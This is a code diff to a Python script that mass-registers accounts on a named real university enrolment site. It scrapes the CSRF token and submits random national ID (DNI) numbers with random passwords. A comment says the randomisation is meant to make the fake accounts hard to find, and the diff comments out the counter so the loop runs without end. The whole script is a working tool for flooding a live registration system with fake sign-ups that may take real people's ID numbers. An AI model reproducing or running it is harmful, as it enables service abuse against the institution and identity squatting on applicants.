@@ -15,22 +15,23 @@ headers = {
 
 with open("lastOne.txt","r") as f:
     dni = int(f.read())
+
 while dni<=99999999 :
     r = requests.get("http://www.inscripciones.uni.edu.pe/login");
     text = r.text
     soup = BeautifulSoup(text , features = "lxml").body
     token = soup.find_all('input')[0]['value']
-    dni_str = str(dni)
+    dni_str = "7"+str(random.randint(1000000,9999999))
     password = str(random.randint(100000,999999)) #Make difficult to find wich one is fake
     data = {
         '_token':token,
-        'dni': dni,
+        'dni': dni_str,
         'password': password,
         'password_confirmation': password
     }
     r = requests.post('http://www.inscripciones.uni.edu.pe/register', data = data, headers=headers, cookies=r.cookies)
     if dni%50==0:
-        print(str(dni)+":"+str(r.status_code))
+        print(str(dni_str)+":"+str(r.status_code))
         with open("lastOne.txt","w") as f:
             f.write(str(dni))
-    dni+=1
+    #dni+=1
